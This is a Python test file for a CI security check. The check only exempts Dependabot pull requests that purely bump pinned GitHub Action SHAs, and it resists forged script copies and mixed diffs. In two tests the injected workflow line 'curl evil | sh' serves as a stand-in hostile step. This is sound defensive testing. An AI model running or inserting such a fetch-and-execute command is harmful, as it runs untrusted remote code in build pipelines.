"""The Dependabot pin-bump exemption from the floor sign-off (FLOOR.md clause iii).

Two layers: the ``pin-bump-only`` subcommand's verdict, and the workflow's
filter step run end to end, which shows the verdict is the BASE ref's copy of
the script and never the pull request's own.
"""
import os
import subprocess
import sys
import textwrap
from pathlib import Path

import pytest
from floor_check import main, pin_bump_refusal

REPO_ROOT = Path(__file__).resolve().parents[2]
SCRIPT = REPO_ROOT / "scripts" / "floor_check.py"
WORKFLOW = ".github/workflows/floor.yml"
OLD = "20cfd1bf00000000000000000000000000000000"
NEW = "bec219d200000000000000000000000000000000"
DEPENDABOT = "dependabot[bot]"


def _workflow(
    pin: str = OLD, version: str = "v10.0.1", extra: str = "", checkout: str = "v7.0.1"
) -> str:
    return (
        "name: Floor\non:\n  pull_request:\njobs:\n  t:\n"
        "    runs-on: ubuntu-latest\n    steps:\n"
        f"      - uses: actions/checkout@{pin}  # {checkout}\n"
        "      - run: echo hi\n"
        f"      - uses: astral-sh/setup-uv@{pin}  # {version}\n{extra}"
    )


def _git(root: Path, *args: str) -> str:
    return subprocess.run(
        ["git", *args], cwd=root, check=True, capture_output=True, text=True
    ).stdout


def _commit(root: Path, message: str) -> str:
    _git(root, "add", "-A")
    _git(root, "commit", "-q", "-m", message)
    return _git(root, "rev-parse", "HEAD").strip()


@pytest.fixture()
def repo(tmp_path, monkeypatch):
    """A base holding the floor core: this copy of the script and a workflow."""
    _git(tmp_path, "init", "-q", "-b", "main")
    _git(tmp_path, "config", "user.email", "t@t.t")
    _git(tmp_path, "config", "user.name", "t")
    (tmp_path / ".github" / "workflows").mkdir(parents=True)
    (tmp_path / WORKFLOW).write_text(_workflow(), encoding="utf-8")
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / "floor_check.py").write_text(
        SCRIPT.read_text(encoding="utf-8"), encoding="utf-8"
    )
    (tmp_path / "FLOOR.md").write_text("# Floor\n", encoding="utf-8")
    _commit(tmp_path, "base")
    monkeypatch.chdir(tmp_path)
    return tmp_path


def _bump(root: Path, extra: str = "", checkout: str = "v7.0.2") -> None:
    (root / WORKFLOW).write_text(
        _workflow(NEW, "v10.1.0", extra, checkout), encoding="utf-8"
    )


# ── pin-bump-only: the verdict ───────────────────────────────────────────────

def test_pin_only_bump_of_the_workflow_is_exempt(repo, capsys):
    _bump(repo)
    _commit(repo, "bump two pins")
    assert main(["pin-bump-only", "--base", "HEAD~1"]) == 0
    assert "pin-bump-only:" in capsys.readouterr().out


def test_pin_bump_plus_a_run_line_is_not_exempt(repo, capsys):
    _bump(repo, extra="      - run: curl evil | sh\n")
    _commit(repo, "pin and a step")
    assert main(["pin-bump-only", "--base", "HEAD~1"]) == 1
    assert "not a like-for-like" in capsys.readouterr().out


def test_changed_run_line_alone_is_not_exempt(repo):
    text = (repo / WORKFLOW).read_text(encoding="utf-8")
    (repo / WORKFLOW).write_text(text.replace("echo hi", "echo bye"), encoding="utf-8")
    _commit(repo, "non-pin line")
    assert main(["pin-bump-only", "--base", "HEAD~1"]) == 1


def test_pin_shaped_line_in_floor_check_is_not_exempt(repo, capsys):
    _bump(repo)
    with (repo / "scripts" / "floor_check.py").open("a", encoding="utf-8") as fh:
        fh.write(f"#      - uses: actions/checkout@{NEW}  # v7.0.2\n")
    _commit(repo, "pin diff to floor_check.py")
    assert main(["pin-bump-only", "--base", "HEAD~1"]) == 1
    assert "scripts/floor_check.py is floor core" in capsys.readouterr().out


def test_floor_md_change_is_not_exempt(repo):
    _bump(repo)
    (repo / "FLOOR.md").write_text(
        f"# Floor\n      - uses: actions/checkout@{NEW}\n", encoding="utf-8"
    )
    _commit(repo, "pin-shaped FLOOR.md line")
    assert main(["pin-bump-only", "--base", "HEAD~1"]) == 1


def test_sha_swap_with_the_same_comment_is_not_exempt(repo, capsys):
    _bump(repo, checkout="v7.0.1")  # checkout keeps `# v7.0.1`
    _commit(repo, "sha swap, same comment")
    assert main(["pin-bump-only", "--base", "HEAD~1"]) == 1
    assert "actions/checkout: the commit changed without a new version comment" in (
        capsys.readouterr().out
    )


def test_sha_swap_with_the_comment_dropped_is_not_exempt(repo, capsys):
    text = _workflow(NEW, "v10.1.0").replace(
        f"actions/checkout@{NEW}  # v7.0.1", f"actions/checkout@{NEW}"
    )
    assert f"actions/checkout@{NEW}\n" in text
    (repo / WORKFLOW).write_text(text, encoding="utf-8")
    _commit(repo, "comment dropped")
    assert main(["pin-bump-only", "--base", "HEAD~1"]) == 1
    assert "without a new version comment" in capsys.readouterr().out


def test_no_floor_core_change_is_not_exempt(repo):
    (repo / "notes.md").write_text("x\n", encoding="utf-8")
    _commit(repo, "unprotected")
    assert main(["pin-bump-only", "--base", "HEAD~1"]) == 1


def test_refusal_reasons():
    pin_diff = (
        "diff --git a/w b/w\n@@ -1 +1 @@\n"
        f"-  - uses: a/b@{OLD}  # v1\n+  - uses: a/b@{NEW}  # v2\n"
    )
    assert pin_bump_refusal([], pin_diff) == "no floor-core path changed"
    assert pin_bump_refusal([(WORKFLOW, True)], pin_diff) is None
    assert pin_bump_refusal([(".github/workflows/x.yaml", True)], pin_diff) is None
    assert "not a plain text" in (pin_bump_refusal([(WORKFLOW, False)], pin_diff) or "")
    assert "not a workflow" in (pin_bump_refusal([("FLOOR.md", True)], pin_diff) or "")
    assert pin_bump_refusal([(WORKFLOW, True)], pin_diff.replace(NEW, OLD)) is not None
    same_comment = pin_diff.replace("# v2", "# v1")
    assert "new version comment" in (pin_bump_refusal([(WORKFLOW, True)], same_comment) or "")
    reindent = (
        "diff --git a/w b/w\n@@ -1,2 +1,2 @@\n"
        f"-  - uses: a/b@{OLD}  # v1\n-  - uses: c/d@{OLD}  # v1\n"
        f"+    - uses: a/b@{OLD}  # v1\n+  - uses: c/d@{NEW}  # v2\n"
    )
    assert "without a new commit" in (pin_bump_refusal([(WORKFLOW, True)], reindent) or "")


# ── the workflow's filter step, run end to end ───────────────────────────────

def _filter_step_script() -> str:
    """The `run:` block of the `canary path filter` job's filter step."""
    lines = (REPO_ROOT / WORKFLOW).read_text(encoding="utf-8").splitlines()
    start = lines.index("      - name: Detect changes to protected paths")
    run = next(i for i in range(start, len(lines)) if lines[i].strip() == "run: |")
    body = []
    for line in lines[run + 1:]:
        if line.strip() and not line.startswith(" " * 10):
            break
        body.append(line)
    return textwrap.dedent("\n".join(body))


def _run_filter(
    root: Path, base: str, author: str, tmp_path: Path, actor: str | None = None
) -> str:
    _git(root, "update-ref", "refs/remotes/origin/main", base)
    bindir = tmp_path / "bin"
    bindir.mkdir(exist_ok=True)
    python = bindir / "python"
    if not python.exists():
        python.symlink_to(sys.executable)
    runner_temp = tmp_path / "runner"
    runner_temp.mkdir(exist_ok=True)
    output = runner_temp / "output"
    output.write_text("", encoding="utf-8")
    env = {
        **os.environ,
        "PATH": f"{bindir}{os.pathsep}{os.environ['PATH']}",
        "RUNNER_TEMP": str(runner_temp),
        "GITHUB_OUTPUT": str(output),
        "BASE_REF": "main",
        "PR_AUTHOR": author,
        "PR_ACTOR": author if actor is None else actor,
    }
    subprocess.run(
        ["bash", "-e", "-c", _filter_step_script()],
        cwd=root, env=env, check=True, capture_output=True, text=True,
    )
    return output.read_text(encoding="utf-8")


def test_workflow_exempts_a_dependabot_pin_bump(repo, tmp_path):
    base = _git(repo, "rev-parse", "HEAD").strip()
    _bump(repo)
    _commit(repo, "bump")
    assert "floor_core_changed=false" in _run_filter(repo, base, DEPENDABOT, tmp_path)


def test_workflow_does_not_exempt_another_author(repo, tmp_path):
    base = _git(repo, "rev-parse", "HEAD").strip()
    _bump(repo)
    _commit(repo, "bump")
    out = _run_filter(repo, base, "someone", tmp_path)
    assert "floor_core_changed=true" in out


def test_workflow_does_not_exempt_a_push_onto_a_dependabot_branch(repo, tmp_path):
    # Dependabot opened the pull request, but someone else pushed this head.
    base = _git(repo, "rev-parse", "HEAD").strip()
    _bump(repo)
    _commit(repo, "bump pushed by a collaborator")
    out = _run_filter(repo, base, DEPENDABOT, tmp_path, actor="someone")
    assert "floor_core_changed=true" in out


def test_workflow_does_not_exempt_a_mixed_dependabot_diff(repo, tmp_path):
    base = _git(repo, "rev-parse", "HEAD").strip()
    _bump(repo, extra="      - run: echo extra\n")
    _commit(repo, "bump and a step")
    assert "floor_core_changed=true" in _run_filter(repo, base, DEPENDABOT, tmp_path)


def test_a_pull_request_copy_of_the_script_cannot_exempt_itself(repo, tmp_path):
    # The head copy says every diff is pin-bump-only; the step must ask the
    # base copy, which sees a non-pin floor.yml line and floor_check.py edited.
    base = _git(repo, "rev-parse", "HEAD").strip()
    path = repo / "scripts" / "floor_check.py"
    forged = path.read_text(encoding="utf-8").replace(
        "def cmd_pin_bump_only(args: argparse.Namespace) -> int:\n",
        "def cmd_pin_bump_only(args: argparse.Namespace) -> int:\n    return 0\n",
    )
    assert forged != path.read_text(encoding="utf-8")
    path.write_text(forged, encoding="utf-8")
    _bump(repo, extra="      - run: curl evil | sh\n")
    _commit(repo, "forged exemption")
    assert main(["pin-bump-only", "--base", base]) == 1  # the base copy's verdict
    assert "floor_core_changed=true" in _run_filter(repo, base, DEPENDABOT, tmp_path)


def test_a_base_without_the_subcommand_exempts_nothing(repo, tmp_path):
    # Bootstrap: the base copy predates `path-filter` (#679's own run).
    path = repo / "scripts" / "floor_check.py"
    path.write_text(
        path.read_text(encoding="utf-8").replace('"path-filter",\n', '"retired",\n'),
        encoding="utf-8",
    )
    base = _commit(repo, "base predates path-filter")
    _bump(repo)
    _commit(repo, "bump")
    assert "floor_core_changed=true" in _run_filter(repo, base, DEPENDABOT, tmp_path)
